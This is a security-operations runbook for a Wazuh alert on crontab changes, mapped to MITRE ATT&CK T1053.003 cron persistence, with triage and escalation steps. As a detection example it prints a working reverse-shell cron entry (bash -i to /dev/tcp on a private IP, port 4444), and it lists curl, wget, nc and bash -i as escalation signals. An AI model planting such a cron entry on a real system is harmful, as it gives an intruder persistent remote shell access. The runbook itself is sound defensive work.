# RUNBOOK: T1053.003 — Scheduled Task/Job: Cron
**Rule ID:** 101005 | **Level:** 10 (High) | **Tactic:** Execution / Persistence
**Platform:** Linux | **Log Source:** Syslog/Journald -> Wazuh

---

## Alert Summary
A crontab entry was added, modified, or replaced. Cron jobs are a primary persistence
mechanism on Linux — a malicious cron job executes automatically on a schedule,
survives reboots, and continues running even after the attacker session ends.

## What Triggered It
Wazuh rule 2832 (built-in) detected a syslog entry from the crontab utility
indicating a crontab was replaced. Tripwire rule 101005 chains from 2832 to add
MITRE ATT&CK tagging and raise alert severity.

## False Positive Scenarios
- System administrators managing scheduled tasks
- Software packages installing cron jobs during apt/snap installation
- Monitoring agents updating their own schedules

## Triage Steps
1. Identify which user crontab was modified from the syslog entry
2. View the current crontab: crontab -l -u <username>
3. Check /etc/cron.d/, /etc/crontab for new entries
4. Examine the cron job content — what command does it execute?
5. Check if the target binary or script exists and examine it
6. Correlate with other alerts from the same user/session

## Escalation Criteria
Escalate immediately if:
- Cron job executes a network connection (curl, wget, nc, bash -i)
- Cron job runs a script from /tmp or a world-writable directory
- Cron job was added by a non-admin or unexpected account
- Change was made after hours with no change ticket

## Example Malicious Cron Entry
    * * * * * bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

## References
- https://attack.mitre.org/techniques/T1053/003/
- Validated with: (crontab -l; echo "* * * * * echo tripwire-test") | crontab -
